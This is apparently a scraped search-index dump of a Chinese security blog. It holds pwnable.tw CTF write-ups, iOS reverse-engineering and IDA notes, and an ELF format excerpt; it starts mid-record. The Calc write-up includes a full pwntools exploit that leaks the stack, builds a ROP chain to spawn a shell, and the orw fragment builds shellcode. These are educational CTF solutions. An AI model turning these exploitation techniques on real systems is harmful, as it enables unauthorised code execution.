shellcraft.i386.pushstr(\u0026#34;/home/orw/flag\u0026#34;), shellcraft.i386.linux.syscall(\u0026#34;SYS_open\u0026#34;, \u0026#39;esp\u0026#39;), shellcraft.i386.linux.syscall(\u0026#34;SYS_read\u0026#34;, \u0026#39;eax\u0026#39;, \u0026#39;esp\u0026#39;, 0x30), shellcraft.i386.linux.syscall(\u0026#34;SYS_write\u0026#34;, 1, \u0026#39;esp\u0026#39;, 0x30) ])) assert len(shellcode) \u0026lt; 0xc8 self.p.send(shellcode) def pwn(self): self.inject_shellcode() self.p.interactive() self.p.wait_for_close() if __name__ == \u0026#34;__main__\u0026#34;: c = Challenge(False) c.pwn() 也可以跟 start 一样，我们可以直接使用 80 中断调用这三个函数。\n"},{"id":23,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/pwnable/3.calc/","title":"3.Calc","section":"pwnable","content":"CALC #  保护等级 #  首先检查安全保护等级：\n$ checksec calc [*] \u0026#39;/media/data/program/ctf/pwnable/calc/calc\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 程序开启了 NX 保护，不能执行栈代码。我们再看程序的链接方式：\n$ objdump -R calc calc： 文件格式 elf32-i386 objdump: calc：不是动态对象 objdump: calc: invalid operation 程序是静态链接。\n程序逻辑 #  main #  在 gdb 中我们可以看到这个程序的逻辑结构过于复杂，我们使用 Ida Pro 打开。首先看 main 函数，可以在 Ida Pro 中查看其伪代码：\nint __cdecl main(int argc, const char **argv, const char **envp) { ssignal(14, timeout); alarm(60); puts(\u0026#34;=== Welcome to SECPROG calculator ===\u0026#34;); fflush(stdout); calc(); return puts(\u0026#34;Merry Christmas!\u0026#34;); } calc #  显然 calc 是这个程序的主函数：\nunsigned int calc() { int buffer_len; // [esp+18h] [ebp-5A0h]  int buffer[100]; // [esp+1Ch] [ebp-59Ch]  char expr; // [esp+1ACh] [ebp-40Ch]  unsigned int canary; // [esp+5ACh] [ebp-Ch]  canary = __readgsdword(0x14u); while ( 1 ) { bzero(\u0026amp;expr, 0x400u); if ( !get_expr((int)\u0026amp;expr, 1024) ) break; init_pool(\u0026amp;buffer_len); if ( parse_expr((int)\u0026amp;expr, \u0026amp;buffer_len) ) { printf((const char *)\u0026amp;unk_80BF804, buffer[buffer_len - 1]); fflush(stdout); } } return __readgsdword(0x14u) ^ canary; } 并且可以查看它的调用栈：\n我们逐个分析这个伪代码的功能：\n v4 = __readgsdword(0x14u) 这个从 MSDN 中可以找到函数的功能，它从与 gs 段起始位置相对 0x14u 的位置中取出一个数字并赋值给 v4。它应该是实现了一个 Canary 的功能。 循环中第一个语句 bzero(%ebp - 0x40c, 0x400) 仔细查看了其中的函数调用，之后又以无参数形式调用了 bzero() 的一个重载，不太看得懂。我们猜测是初始化的； get_expr(%ebp - 0x40c, 1024) 应该是从我们的标准输入读取表达式的函数，我们暂时不研究其逻辑； init_pool(%ebp - 0x5a0); 这个函数的作用是，将传入的指针作为一个四字节的指针，并且将这个地址之后的的 100 个位置全部赋值为 0。是一个初始化 int 数组的函数。 parse_expr(%ebp -0x40c, %ebp - 0x5a0) 应该是将输入解析到 %ebp - 0x5a0 这个地方做存储结果的函数，我们暂时不研究其逻辑； 如果解析成功会调用 printf((const char *)\u0026amp;unk_80BF804, v2[v1 - 1]);，其中 unk_80BF804 的内容就是 %d，v2[v1 - 1] 应该是结果存储的位置（由它们的相对位置我们可以分析知道，v2 是一个字符串，v1 应该是一个标记结果与 v2 起始位置相对位置的整数）。  逻辑清晰了，我们接着分析取表达式和解析表达式这两个关键的函数。\nget_expr #  首先是 get_expr 读取表达式的函数，我重命名了其中的变量，逻辑非常地清晰：\nint __cdecl get_expr(int dest, int max_len) { int chr_pos; // eax  char input_chr; // [esp+1Bh] [ebp-Dh]  int cur_len; // [esp+1Ch] [ebp-Ch]  cur_len = 0; while ( cur_len \u0026lt; max_len \u0026amp;\u0026amp; read(0, \u0026amp;input_chr, 1) != -1 \u0026amp;\u0026amp; input_chr != \u0026#39;\\n\u0026#39; ) { if ( input_chr == \u0026#39;+\u0026#39; || input_chr == \u0026#39;-\u0026#39; || input_chr == \u0026#39;*\u0026#39; || input_chr == \u0026#39;/\u0026#39; || input_chr == \u0026#39;%\u0026#39; || input_chr \u0026gt; 47 \u0026amp;\u0026amp; input_chr \u0026lt;= 57 ) { chr_pos = cur_len++; *(_BYTE *)(dest + chr_pos) = input_chr; } } *(_BYTE *)(cur_len + dest) = 0; return cur_len; } eval #  在讨论函数 parse_expr 之前，我们先分析在它调用最频繁的函数 eval：\nint *__cdecl eval(int *num_stack, char operator) { int *result; // eax  if (operator== \u0026#39;+\u0026#39;) { num_stack[*num_stack - 1] += num_stack[*num_stack]; } else if (operator\u0026gt; 43) { if (operator== \u0026#39;-\u0026#39;) { num_stack[*num_stack - 1] -= num_stack[*num_stack]; } else if (operator== \u0026#39;/\u0026#39;) { num_stack[*num_stack - 1] /= num_stack[*num_stack]; } } else if (operator== \u0026#39;*\u0026#39;) { num_stack[*num_stack - 1] *= num_stack[*num_stack]; } result = num_stack; --*num_stack; return result; } 简单地说这个函数做了这样一件事情：\n 它传入一个数字栈和一个字符型的操作符 它弹出了栈顶的两个元素，对栈顶的这两个元素进行这个操作符所指定的运算 将这个运算结果压栈  parse_expr #  然后我们分析 parse_expr，漏洞应该就出现在这里。我通读了伪代码之后重命名了一些局部变量，并且对照汇编代码解决了一些不必要的转换之后得到以下的伪代码：\nsigned int __cdecl parse_expr(int src_str, _DWORD *dest) { int dest_len; // [esp+18h] [ebp-90h]  char *src_str_cpy; // [esp+1Ch] [ecp-8Ch]  int numstr_bgn; // [esp+20h] [ebp-88h]  int i; // [esp+24h] [ebp-84h]  int stack_top; // [esp+28h] [ebp-80h]  int numstr_len; // [esp+2Ch] [ebp-7Ch]  char *numstr; // [esp+30h] [ebp-78h]  int number; // [esp+34h] [ebp-74h]  char stack[100]; // [esp+38h] [ebp-70h]  unsigned int canary; // [esp+9Ch] [ebp-Ch]  canary = __readgsdword(0x14u); numstr_bgn = src_str; stack_top = 0; bzero(stack, 0x64u); for (i = 0;; ++i) { // if operator  if ((unsigned int)(*(char *)(i + src_str) - 48) \u0026gt; 9) { numstr_len = i + src_str - numstr_bgn; numstr = (char *)malloc(numstr_len + 1); memcpy(numstr, numstr_bgn, numstr_len); numstr[numstr_len] = 0; if (!strcmp(numstr, \u0026#34;0\u0026#34;)) { puts(\u0026#34;prevent division by zero\u0026#34;); fflush(stdout); return 0; } number = atoi(numstr); if (number \u0026gt; 0) { dest_len = (*dest)++; dest[dest_len + 1] = number; } if (*(_BYTE *)(i + src_str) \u0026amp;\u0026amp; (unsigned int)(*(char *)(i + 1 + src_str) - 48) \u0026gt; 9) { puts(\u0026#34;expression error!\u0026#34;); fflush(stdout); return 0; } numstr_bgn = i + 1 + src_str; if (stack[stack_top]) { switch (*(char *)(i + src_str)) { case \u0026#39;%\u0026#39;: case \u0026#39;*\u0026#39;: case \u0026#39;/\u0026#39;: // */%: 栈顶是加减法则将操作符入栈，否则调用 eval 后覆盖栈顶  if (stack[stack_top] != \u0026#39;+\u0026#39; \u0026amp;\u0026amp; stack[stack_top] != \u0026#39;-\u0026#39;) { eval(dest, stack[stack_top]); stack[stack_top] = *(_BYTE *)(i + src_str); } else { stack[++stack_top] = *(_BYTE *)(i + src_str); } break; case \u0026#39;+\u0026#39;: case \u0026#39;-\u0026#39;: // +-: 调用 eval 后覆盖栈顶  eval(dest, stack[stack_top]); stack[stack_top] = *(_BYTE *)(i + src_str); break; default: eval(dest, stack[stack_top--]); break; } } else { stack[stack_top] = *(_BYTE *)(i + src_str); } if (!*(_BYTE *)(i + src_str)) break; } } while (stack_top \u0026gt;= 0) eval(dest, stack[stack_top--]); return 1; } 这个解析运算符的流程大致可以从 数字栈 num_stack 与 操作符栈 op_stack 这两个栈之间的运算展开。我觉得有必要用一个状态转换图来解释这个函数的工作流程，我们用操作符栈的栈顶来确定三种状态：\n 上图中：方形表示状态，矩形表示执行的操作，箭头上的字符表示状态转移条件； 上图中：State1 表示操作符栈顶为空，State2 表示操作符栈顶不是 +- 号，State3 表示操作符栈顶是加减号。很显然，初始状态是 State1； 程序的逻辑保证了：任何一个操作符后一个字符不会是操作符，除号的第二个操作符不能是 \u0026quot;0\u0026quot;  漏洞 #  发现 #  经过上面的分析，parse_expr 这个函数我主要发现了两个漏洞：\n 程序在排除被除数不为 0 的条件时，用的判断是被除数字符串不等于 \u0026quot;0\u0026quot;；对于这个漏洞，我们可以通过输入 \u0026quot;00\u0026quot; 等方式让程序产生除零操作。但是并不知道这个漏洞如何利用； 程序在执行 eval 时，必须要满足数字栈中存在大于两个的数字，但是以下原因会导致这个条件并不成立：  输入字符串的第一个字符为操作符； 某次的输入数字为 0，这个数字则不会被程序压栈；    下面我们尝试利用第二条的第一个漏洞，就可以改变数字栈的高度，从而达到修改任意地址的目的。\n利用 #  我们利用的基本思路是：先泄露栈地址，然后注入字符串 /bin/sh，最后构造一个这样的栈：\nstack-top\t|ad1\t|0xb\t|ad2\t|0x0\t|adstr\t|ad3\t|0x0\t|ad4\r其中 ad1、ad2、ad3、ad4 是三个通过 ROP 技术的到的三个地址，它们分别执行：\nad1:\tpop %eax; ret;\rad2:\tpop %ecx; pop %ebx; ret;\rad3:\tpop %edx; ret;\rad4:\tint 80h;\r而其中的 adstr 则是之前注入的 /bin/sh 的地址。构造了如下的 exp：\n#!/usr/bin/env python #coding=utf-8 from pwn import * class Challenge: def __init__(self, local=True): self.local = local if local: self.p = process([\u0026#39;./calc\u0026#39;]) else: self.p = remote(\u0026#34;chall.pwnable.tw\u0026#34;, 10100) def gdb(self): assert self.local context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] gdb.attach(proc.pidof(self.p)[0], gdbscript=\u0026#34;b *get_expr\u0026#34;) def leak_ebp(self): \u0026#34;\u0026#34;\u0026#34; payload: *361 \u0026#34;\u0026#34;\u0026#34; offset = 0x5a0 / 4 + 1 self.payload = \u0026#34;*%d\\n\u0026#34; % (offset) self.p.send(self.payload) self.main_ebp = int(self.p.recvline(), 10) \u0026amp; 0xffffffff self.calc_ebp = self.main_ebp - 0x20 self.parse_expr_ebp = self.calc_ebp - 0x5c0 print(\u0026#34;main $ebp:\u0026#34; + hex(self.main_ebp)) print(\u0026#34;calc $ebp:\u0026#34; + hex(self.calc_ebp)) print(\u0026#34;parse_ebp $ebp:\u0026#34; + hex(self.parse_expr_ebp)) def write_binsh(self): \u0026#34;\u0026#34;\u0026#34; payload: *701+1845554944+6845231 \u0026#34;\u0026#34;\u0026#34; binsh = [u32(\u0026#34;/bin\u0026#34;), u32(\u0026#34;/sh\\0\u0026#34;)] # 0x6e69622f, 0x0068732f sent_number = [binsh[0]-binsh[1], binsh[1]] self.payload = \u0026#34;*701+%d+%d\\n\u0026#34; % (sent_number[0], sent_number[1]) self.p.send(self.payload) assert p32(int(self.p.recvline(), 10)) == \u0026#34;/bin\u0026#34; self.binsh_addr = self.calc_ebp - 0x5a0 + 700 * 4 print(\u0026#34;write \u0026#39;/bin/sh\u0026#39;: %s\u0026#34; % hex(self.binsh_addr) ) def ROP(self): addr1 = 0x0805c34b # pop eax; ret addr2 = 0x080701d1 # pop ecx; pop ebx; ret addr3 = 0x080701aa # pop edx; ret addr4 = 0x08049a21 # int 0x80 stack = [addr1, 0xb, addr2, 0x0, -0x100000000 + self.binsh_addr, addr3, 0x0, addr4] n = [ stack[i+1] + stack[i] for i in range(7)] + [ stack[7] ] assert n[3] \u0026lt; 0 self.payload = \u0026#34;*361-1*%d-1*%d-1*%d-1*%d+%d+%d\u0026#34; % \\ (n[0], n[1], n[2], -n[3], 0x80000000+n[3], 0x80000000+n[3]) if n[4] \u0026gt; 0: self.payload += \u0026#34;-1*%d\u0026#34; % n[4] else: self.payload += \u0026#34;-1*%d+%d+%d\u0026#34; % (-n[4], 0x80000000 + n[4], 0x80000000 + n[4] ) self.payload += \u0026#34;-1*%d-1*%d-1*%d\\n\u0026#34; % (n[5], n[6], n[7]) self.p.send(self.payload) self.p.recvline() def get_shell(self): self.p.send(\u0026#34;illegal\u0026#34;) self.p.interactive() def pwn(self): print(\u0026#34;----------begin-----------\u0026#34;) self.p.recvline() self.leak_ebp() self.write_binsh() self.ROP() self.get_shell() self.p.wait_for_close() print(\u0026#34;-----------end------------\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: s = Challenge(True) s.pwn() 写 exp 最后 debug 的时候有以下的几个坑点：\n 我们利用乘法优先级比较高的特性，可以构造 1*addr 这样的表达式将上面的地址全部按顺序压入栈中。但是问题是 adstr 是一个负数，用这种方式压栈会出现表达式错误（*- 两个运算符同时出现）。 /bin/sh 这个字符串不能写在 calc 这个函数的局部变量区，因为每次循环时会被初始化。  "},{"id":24,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/pwnable/4.3x17/","title":"4.3x17","section":"pwnable","content":" 参考资料：\n https://github.com/maroueneboubakri/lscan/wiki/Reverse-Engineer-a-stripped-binary-with-lscan-and-IDApro https://www.jianshu.com/p/7a1441e4f355   3x17 #  保护等级 #  首先检查程序的保护等级：\n$ checksec 3x17 [*] \u0026#39;/media/data/program/ctf/pwnable/3x17/3x17\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 首先我们发现这是一个 64 位的程序，另外程序没有开启栈溢出的 canary 保护，但是堆栈不可执行。\n我们再看程序的链接方式：\n$ objdump -R 3x17 3x17： 文件格式 elf64-x86-64 objdump: 3x17：不是动态对象 objdump: 3x17: invalid operation 是一个静态链接的文件。看各个段的权限：\ngdb-peda$ vmmap Start End Perm\tName 0x00401000 0x0048e335 rx-p\t/root/ctf/pwnable/3x17/3x17 0x00400200 0x004b2a31 r--p\t/root/ctf/pwnable/3x17/3x17 0x004b40c0 0x004baa20 rw-p\t/root/ctf/pwnable/3x17/3x17 加载 sig 函数签名 #  lscan.py #  在 gdb 中我们并没有发现任何函数名与变量名的信息。于是我们可以尝试为文件添加一些标识，否则分析起来就太困难了。\n我在网上找了一圈，发现大家都用一个 lscan.py 的项目，这是一个启发式的检测项目，这个项目通过识别文件的签名，为静态链接的文件查找最可能用于链接的签名文件：\n$ mkvirtualenv -p python2.7 Reverse2.7 $ pip install pyelftools pefile $ git clone https://github.com/maroueneboubakri/lscan.git \u0026amp;\u0026amp; cd lscan $ python lscan.py -f D:/program/ctf/pwnable/3x17/3x17 -S ./amd64/sig D:\\program\\git\\lscan\\amd64\\sig\\libc-2.13.sig 12266/3369 (364.08%) D:\\program\\git\\lscan\\amd64\\sig\\libc-2.22.sig 12870/2859 (450.16%) D:\\program\\git\\lscan\\amd64\\sig\\libc-2.23.sig 13163/2869 (458.80%) D:\\program\\git\\lscan\\amd64\\sig\\libcrypto-1.0.2h.sig 36850/5057 (728.69%) D:\\program\\git\\lscan\\amd64\\sig\\libm-2.13.sig 11125/445 (2500.00%) D:\\program\\git\\lscan\\amd64\\sig\\libm-2.22.sig 11121/582 (1910.82%) D:\\program\\git\\lscan\\amd64\\sig\\libm-2.23.sig 11124/600 (1854.00%) D:\\program\\git\\lscan\\amd64\\sig\\libpcre-8.38.sig 18/150 (12.00%) D:\\program\\git\\lscan\\amd64\\sig\\libpthread-2.13.sig 11379/319 (3567.08%) D:\\program\\git\\lscan\\amd64\\sig\\libpthread-2.22.sig 11159/262 (4259.16%) D:\\program\\git\\lscan\\amd64\\sig\\libpthread-2.23.sig 11160/258 (4325.58%) D:\\program\\git\\lscan\\amd64\\sig\\libssl-1.0.2h.sig 0/665 (0.00%) 我们发现它们的识别率都超过的 100%，而项目官网上提供的 demo 中是很正确的，那一定是哪里出了问题，于是我开始阅读这个工具的源码以修正这一 bug。\n项目修复 #  我们首先使用 pycallgraph 这个工具得到了一个函数的调用图：\n可见 lscan 的大致流程大概分为三步：解析 elf 可执行文件、解析 sig 签名文件、匹配 sig 与 elf。根据上面出现的问题，应该是第三步解析错误。\nEDIT：修了一半，bug 实在太多了！！！放弃这个工具。我要取消 github 上的赞。\nIDA 插件 #  在 Google 上找了很久想要可以满足这个需求的插件：\n github 上有一个各种插件的列表：https://github.com/onethawt/idaplugins-list。但是这里面似乎没有。  程序流程 #  start #  在程序入口函数 start 调用的几个函数中，可以根据参数判断看到 main 函数。\nmain #  main 函数中，由 Ida Pro 的到的 c 代码对某些函数的参数处理似乎有一些问题：\n// local variable allocation has failed, the output may be wrong!\rint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint result; // eax\rint v4; // eax\rchar *v5; // ST08_8\r__int64 v6; // rcx\runsigned __int64 v7; // rt1\rchar buf[24]; // [rsp+10h] [rbp-20h]\runsigned __int64 v9; // [rsp+28h] [rbp-8h]\rv9 = __readfsqword(0x28u);\rresult = (unsigned __int8)++ITER;\rif ( ITER == 1 )\r{\rwrite(1u, \u0026quot;addr:\u0026quot;, 5uLL);\rread(0, buf, 0x18uLL);\rstrcpy((__int64)buf);\rv5 = (char *)v4;\rwrite(1u, \u0026quot;data:\u0026quot;, 5uLL);\rargv = (const char **)v5;\r*(_QWORD *)\u0026amp;argc = 0LL;\rread(0, v5, 0x18uLL);\rresult = 0;\r}\rv7 = __readfsqword(0x28u);\rv6 = v7 ^ v9;\rif ( v7 != v9 )\rsub_44A3E0(*(_QWORD *)\u0026amp;argc, argv, envp, v6);\rreturn result;\r}\rmain 函数的逻辑大致是：\n 先检测全局变量中 ITER 的值，如果通过检测，则执行下面的两步：  读取 0x18 个字节 addr 到缓冲区内，然后进行一次字符串复制（strcpy 函数是猜的）； 再读取 0x18 个字节 data 到缓冲区内，然后再进行一次字符串赋值；   检测栈溢出，如果栈溢出发生则调用 sub_44A3E0 函数。  我再仔细看看条件分支内的汇编代码（然后我们重新自己命名了函数）：\n; 15: write(1u, \u0026quot;addr:\u0026quot;, 5uLL);\rmov [rbp+var_28], 0\rmov edx, 5 ; count\rlea rsi, buf ; \u0026quot;addr:\u0026quot;\rmov edi, 1 ; fd\rmov eax, 0\rcall write\r; 16: read(0, buf, 0x18uLL);\rlea rax, [rbp+buf]\rmov edx, 18h ; count\rmov rsi, rax ; buf\rmov edi, 0 ; fd\rmov eax, 0\rcall read\r; 17: addr = atoi((__int64)buf);\rlea rax, [rbp+buf]\rmov rdi, rax\rmov eax, 0\rcall atoi\rcdqe\rmov [rbp+addr], rax\r; 18: write(1u, \u0026quot;data:\u0026quot;, 5uLL);\rmov edx, 5 ; count\rlea rsi, aData ; \u0026quot;data:\u0026quot;\rmov edi, 1 ; fd\rmov eax, 0\rcall write\r; 19: read(0, addr \u0026amp; 0xffffffff, 0x18);\rmov rax, [rbp+addr]\rmov edx, 18h ; count\rmov rsi, rax ; buf\rmov edi, 0 ; fd\rmov eax, 0\rcall read\rmov eax, 0\rjmp short loc_401C37\r也就是说，高级语言代码应该是这样的：\nint __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax  int addr; // ST08_8  __int64 v6; // rcx  unsigned __int64 v7; // rt1  char buf[24]; // [rsp+10h] [rbp-20h]  unsigned __int64 v9; // [rsp+28h] [rbp-8h]  v9 = __readfsqword(0x28u); result = (unsigned __int8)++ITER; if ( ITER == 1 ) { write(1u, \u0026#34;addr:\u0026#34;, 5uLL); read(0, buf, 0x18uLL); addr = atoi((__int64)buf); write(1u, \u0026#34;data:\u0026#34;, 5uLL); read(0, addr \u0026amp; 0xffffffff, 0x18); result = 0; } if ( v9 != __readfsqword(0x28u)) __stack_chk_fail(*(_QWORD *)\u0026amp;argc, argv, envp); return result; } 可见它主要提供了一个任意地址写的功能，但是由于我们只能控制低 32 位，因此不能往栈上写入内容。查看之前的权限查看，在程序段中 0x004b40c0 - 0x004baa20 这段地址是可写的。\n漏洞发现与利用 #  漏洞非常明显，不需要发现，直接进行利用。\n构造循环 #  "},{"id":25,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1.%E6%AD%A3%E5%90%91%E5%9F%BA%E7%A1%80/","title":"1.正向基础","section":"iOS逆向分析","content":"正向基础 #  App 结构与构建 #  应用包的本质？\niOS 中的应用包有 .app 与 .ipa 两种形式，前者就是一个文件夹，后者是这个文件夹的 zip 格式压缩包（Android 中的 .apk）。\n如何获取一个线上 App 的 ipa 文件包？\n在 iTunes 之后，苹果官方提供了一个方法进行 ipa 的下载，即应用：Apple Configurator 2。在这个应用中下载了 App 之后，可以在以下的文件夹下找到 ipa 文件：\n /Users/shesonglin/Library/Group Containers/K36BKF7T3D.group.com.apple.configurator/Library/Caches/Assets/TemporaryItems/MobileApps  App 签名 #  签名原理 #  App 签名是一个基于 CA 的认证架构，CA 指 Certificate Authority，对于 CA 机构的信任是一切现代信息安全互信体系的基石。\nCA 的认证流程大致如下：\n上面的流程大致的阐述了如何实现一个用户，如何实现对一个未知身份的开发者的信任问题。\n对于这一体系在 App 信任中的应用，则可以用下面的流程阐述：\n具体在 iOS 中，App 签名这个过程中有以下关键的几个文件：\n CertificateSigningRequest.certSigningRequest：对应上图中的 Dev-PublicKey 的打包文件； iOS_development.cer；对应上图一中绿色的 certificate 文件； Entitlements 授权文件，一般是 plist 后缀：在上图二中，对 App 的哈希过程中，也会加入 App 的授权信息；  重签名 #  一旦改变了 App 的二进制内容或任何授权内容，上面的授权信息 distribution certificate 就会被破坏。App 信息完整性验证这一过程就会失败，因此我们就需要对 App 进行重签名。\n重签名的步骤大致如下：\n  通过命令获取本机上的证书列表：\n$ security find-identity -p codesigning -v   生成 entitlements.plist：\n  复制 mobileprovision 文件到 .app 目录下；\n  手动签名；\n  将 .app 打包成 .ipa；\n  "},{"id":26,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/2.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/","title":"2.静态分析","section":"iOS逆向分析","content":"静态分析 #  iOS 的静态分析工具主要有 Hopper/IDA Pro。\nHopper #  IDA Pro #  下面是一些 IDA Pro 的常用功能与快捷键：\n 字符串搜索：Alt+T (Windows)；Option+T (Mac OS)； 跳转地址：在 IDA 中按 \u0026ldquo;G\u0026rdquo;，输入指定的跳转地址即可跳转； 编写注释：  可重复注释：按 \u0026ldquo;;\u0026rdquo; 分号，可以添加可重复注释，这种注释会同时出现在其交叉引用的地方； 非重复注释：按 \u0026ldquo;:\u0026rdquo; 冒号，可添加重复注释，优先级大于前者，不过不会出现在交叉引用的位置； 伪代码注释：直接按 \u0026ldquo;/\u0026rdquo; 分号，可以为伪代码添加注释；   变量重命名：单击目标变量，按 \u0026ldquo;N\u0026rdquo; 进行重命名； 查看交叉引用：选中函数/变量，按 \u0026ldquo;X\u0026rdquo; 可以查看当前位置被哪些地方引用了； 进制转换：伪代码展示的数字默认进制是十进制，可以按 \u0026ldquo;H\u0026rdquo; 进行进制转换； 类型声明：变量类型/方法参数签名等，如果 IDA 默认识别有问题，可以按 \u0026ldquo;Y\u0026rdquo; 进行重声明； 格式转化：  在被解析为数据的位置按 \u0026ldquo;C\u0026rdquo; 可以解析为代码，反之按 \u0026ldquo;D\u0026rdquo;； 对于一连串的 ASCII 字符，按 \u0026ldquo;A\u0026rdquo; 可以将一连串地址的字符转化为字符串； 按 \u0026ldquo;U\u0026rdquo; 可以取消对数据段的解析；    静态分析实践 #  产物分析 #  我们使用 XCode 默认建立的工程，在 viewDidLoad 里面编写了一段代码，看看这写代码是如何实现的：\n#define SCREEN_WIDTH [UIScreen mainScreen].bounds.size.width #define SCREEN_HEIGHT [UIScreen mainScreen].bounds.size.height #define TEXT_WIDTH 100 #define TEXT_HEIGHT 100  @implementation ViewController - (void)viewDidLoad { CGPoint origin = CGPointMake((SCREEN_WIDTH - TEXT_WIDTH) / 2, (SCREEN_HEIGHT - TEXT_HEIGHT) / 2); UITextView *customTextView = [[UITextView alloc] initWithFrame:CGRectMake(origin.x, origin.y, TEXT_WIDTH, TEXT_HEIGHT)]; customTextView.text = @\u0026#34;Westworld.\u0026#34;; customTextView.scrollEnabled = YES; customTextView.editable = NO; [self.view addSubview:customTextView]; } @end 在 Product 文件夹中，找到 .app 后缀的产物文件夹，放入 IDA。在左侧窗口注意到这个方法：- [ViewController viewDidLoad]：\nvoid __cdecl -[ViewController viewDidLoad](ViewController *self, SEL a2) { void *v2; // rax  void *v3; // r15  void *v4; // rax  void *v5; // rbx  v2 = (void *)objc_alloc((__int64)\u0026amp;OBJC_CLASS___UITextView, (__int64)a2); v3 = objc_msgSend(v2, \u0026#34;initWithFrame:\u0026#34;, xmmword_100002460, xmmword_100002470); objc_msgSend(v3, \u0026#34;setText:\u0026#34;, CFSTR(\u0026#34;Westworld.\u0026#34;), xmmword_100002460, xmmword_100002470); v4 = objc_msgSend(self, \u0026#34;view\u0026#34;); v5 = (void *)objc_retainAutoreleasedReturnValue((__int64)v4); objc_msgSend(v5, \u0026#34;addSubview:\u0026#34;, v3); objc_release(v5); objc_release(v3); } 上面的伪代码结果可以让我们对 OC 的局部变量的工作机制有一定的了解，有关 objc_alloc / objc_msgSend 等函数的实现，我们使用现在的 .app 产物文件包，暂时是看不到的。\n包大小优化案例 \u0026ndash; Block 优化 #  一个经典的包大小优化方式是 Block 优化，为什么对 Block 的优化可以优化包大小呢？\n我编写了下面一个测试程序：\n- (void)normalSet { [self.testWithMap setMapMsgWithBlock:^(NSMutableDictionary * _Nonnull map) { map[@\u0026#34;hello1\u0026#34;] = @\u0026#34;hello1\u0026#34;; map[@\u0026#34;hello2\u0026#34;] = @\u0026#34;hello2\u0026#34;; map[@\u0026#34;hello3\u0026#34;] = @\u0026#34;hello3\u0026#34;; map[@\u0026#34;hello4\u0026#34;] = @\u0026#34;hello4\u0026#34;; }]; } - (void)optimizeSet { NSMutableDictionary *map = self.testWithMap.testMap; map[@\u0026#34;hello1\u0026#34;] = @\u0026#34;hello1\u0026#34;; map[@\u0026#34;hello2\u0026#34;] = @\u0026#34;hello2\u0026#34;; map[@\u0026#34;hello3\u0026#34;] = @\u0026#34;hello3\u0026#34;; map[@\u0026#34;hello4\u0026#34;] = @\u0026#34;hello4\u0026#34;; } 在 IDA Pro 中分析后可以得到使用两种方法对内存的增量改变：\n除此之外，前者还在数据端保存了一份 block 的结构体：\nstruct __block_impl { void *isa; int Flags; int Reserved; void *FuncPtr; }; 用更直观的图表示：\n这也就是说：\n normalSet 方法占用字节大小：0x60 + 0xC8 + 0x18 = 0x140 optimizeSet 方法占用的字节大小：0xF8 二者占用内存的差值是：0x140 - 0xF8 = 0x48  包大小优化案例 \u0026ndash; 类方法转 C 方法 #  同样的，我们也来研究一下，为什么类方法转 C 方法会可以对内存进行优化。\n测试程序：\nvoid iteratorC(void) { for (int i = 0; i \u0026lt; 100; i++) { NSLog(@\u0026#34;%d\\n\u0026#34;, i); } } @implementation TestClass + (void)iteratorClass { for (int i = 0; i \u0026lt; 100; i++) { NSLog(@\u0026#34;%d\\n\u0026#34;, i); } } @end 在 IDA Pro 中，可以分析这两者之间的函数二进制主体的大小：\n可以看出它们的函数主体大约有 0x8 个字节的差异，这并不是很大的差异，我们看看他们的汇编代码可以看出这个差异在哪里：\nmov [rbp+var_8], rdi mov [rbp+var_10], rsi 这是后者相对于前者多出的两行汇编代码，恰好 8 个字节：\n 后者是 OC 的方法，默认带有 TestClass_meta *self, SEL a2 两个参数； 上面的两行汇编代码是把这两个参数复制寄存器中的代码； 这两行代码在函数主体中没有使用到，是没有意义的编译器产生的冗余代码，很有可能在开启了编译选项后被优化；  那么是否有更有意义的优化呢？我们再编写一段调用方的代码：\n- (void)callC { iteratorC(); } - (void)callClass { [TestClass iteratorClass]; } 在 IDA Pro 中，分析这二者的二进制函数主体大小：\n它们的函数主体大约有 0x12 个字节的差异，同样的我们可以在汇编中看出这一差异来自于：\n# callClass 传递参数的代码贡献了 0x11 个字节的代码增量。 mov rax, cs:classRef_TestClass mov rsi, cs:selRef_iteratorClass ; char * mov rdi, rax ; void * # 两者调用方案本身的汇编代码也有一个字节的差异 call _iteratorC # 5 Bytes call cs:_objc_msgSend_ptr ; +[TestClass iteratorClass] # 6 Bytes 总结起来，后者与前者的差异，可以用下面的图表示：\n在这个具体的例子中，通过这个方式优化的内存为：\n callee 方优化：0x8； caller 方优化：0x12 + 0x8 + 0xD = 0x2D；  这种优化方式显然没有前者高效；\n"},{"id":27,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/elfformat/","title":"Elf Format","section":"LinuxAudit","content":" 参考：\n https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/   ELF Format #  ELF is the abbreviation for Executable and Linkable Format and defines the structure for binaries, libraries, and core files.\nThe formal specification allows the operating system to interpreter its underlying machine instructions correctly. ELF files are typically the output of a compiler or linker and are a binary format. With the right tools, such file can be analyzed and better understood.\nElf Anatomy #  Due to the extensible design of ELF files, the structure differs per file. An ELF file consists of:\n  ELF header\n  File data which consist of three parts:\n  Program Headers or Segments (9)\n  Section Headers or Sections (28)\n  Data\n    ELF Header #  With the readelf command, we can look at the structure of a file and it will look something like this:\n$ readelf -h ret2dlresolve ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2\u0026#39;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: Intel 80386 Version: 0x1 Entry point address: 0x4b0 Start of program headers: 52 